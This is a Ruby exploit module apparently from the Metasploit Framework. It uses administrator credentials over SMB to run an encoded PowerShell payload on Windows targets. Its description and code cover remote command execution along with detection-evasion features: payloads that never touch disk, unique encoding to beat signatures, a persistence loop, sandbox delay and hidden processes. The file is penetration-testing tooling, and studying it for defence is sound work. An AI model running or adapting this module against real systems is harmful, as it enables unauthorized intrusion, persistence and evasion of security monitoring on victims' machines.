
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;msf/core/exploit/powershell&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::SMB::Psexec
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Microsoft Windows Authenticated Powershell Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module uses a valid administrator username and password to execute a powershell
        payload using a similar technique to the "psexec" utility provided by SysInternals. The
        payload is encoded in base64 and executed from the commandline using the -encodedcommand
        flag. Using this method, the payload is never written to disk, and given that each payload
        is unique, is less prone to signature based detection. Since executing shellcode in .NET
        requires the use of system resources from unmanaged memory space, the .NET (PSH) architecture
        must match that of the payload. Lastly, a persist option is provided to execute the payload
        in a while loop in order to maintain a form of persistence. In the event of a sandbox
        observing PSH execution, a delay and other obfuscation may be added to avoid detection.
        In order to avoid interactive process notifications for the current user, the psh payload has
        been reduced in size and wrapped in a powershell invocation which hides the process entirely.
      },

      &#039;Author&#039;         => [
        &#039;Royce @R3dy__ Davis <rdavis[at]accuvant.com>&#039;, # PSExec command module
        &#039;RageLtMan <rageltman[at]sempervictus&#039; # PSH exploit, libs, encoders
      ],

      &#039;License&#039;        => MSF_LICENSE,
      &#039;Privileged&#039;     => true,
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039;     => 10,
          &#039;EXITFUNC&#039; => &#039;thread&#039;
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;        => 8192,
          &#039;DisableNops&#039;  => true,
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
          [ &#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X86_64 } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jan 01 1999&#039;,
      &#039;References&#039;     => [
        [ &#039;CVE&#039;, &#039;1999-0504&#039;], # Administrator with no password (since this is the default)
        [ &#039;OSVDB&#039;, &#039;3106&#039;],
        [ &#039;URL&#039;, &#039;http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access&#039; ],
        [ &#039;URL&#039;, &#039;http://sourceforge.net/projects/smbexec/&#039; ],
        [ &#039;URL&#039;, &#039;http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx&#039; ]
      ]
    ))
  end

  def exploit
    command = cmd_psh_payload(payload.encoded)

    if datastore[&#039;PERSIST&#039;] and not datastore[&#039;DisablePayloadHandler&#039;]
      print_warning("You probably want to DisablePayloadHandler and use exploit/multi/handler with the PERSIST option.")
    end

    if datastore[&#039;RUN_WOW64&#039;] and target_arch.first == "x86_64"
      fail_with(Exploit::Failure::BadConfig, "Select an x86 target and payload with RUN_WOW64 enabled")
    end

    # Try and authenticate with given credentials
    if connect
      begin
        smb_login
      rescue StandardError => autherror
        disconnect
        fail_with(Exploit::Failure::NoAccess, "#{peer} - Unable to authenticate with given credentials: #{autherror}")
      end
      # Execute the powershell command
      print_status("#{peer} - Executing the payload...")
      begin
        return psexec(command)
      rescue StandardError => exec_command_error
        disconnect
        fail_with(Exploit::Failure::Unknown, "#{peer} - Unable to execute specified command: #{exec_command_error}")
      end
    end
  end

  def peer
    return "#{rhost}:#{rport}"
  end
end

